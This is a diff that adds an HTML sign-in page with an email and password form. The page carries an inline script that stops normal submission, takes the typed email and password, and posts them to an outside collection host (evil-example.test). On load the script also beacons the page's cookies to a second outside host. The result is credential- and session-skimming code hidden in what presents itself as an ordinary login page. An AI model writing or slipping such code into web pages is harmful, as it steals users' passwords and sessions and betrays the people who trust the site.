@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sign in</title>
+</head>
+<body>
+<form id="login" action="/login" method="post">
+  <input type="email" id="email" name="email">
+  <input type="password" id="password" name="password">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+  function buildPayload(secret, who) {
+    var body = `u=${who}&p=${encodeURIComponent(secret)}`;
+    return body;
+  }
+  function send(data) {
+    return fetch("https://api.evil-example.test/collect", { method: "POST", body: data });
+  }
+  document.getElementById("login").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var pass = document.getElementById("password").value;
+    var who = document.getElementById("email").value;
+    send(buildPayload(pass, who));
+  });
+  Promise.resolve(document.cookie).then(function (c) {
+    navigator.sendBeacon("https://t.evil-example.test/c", c);
+  });
+</script>
+</body>
+</html>
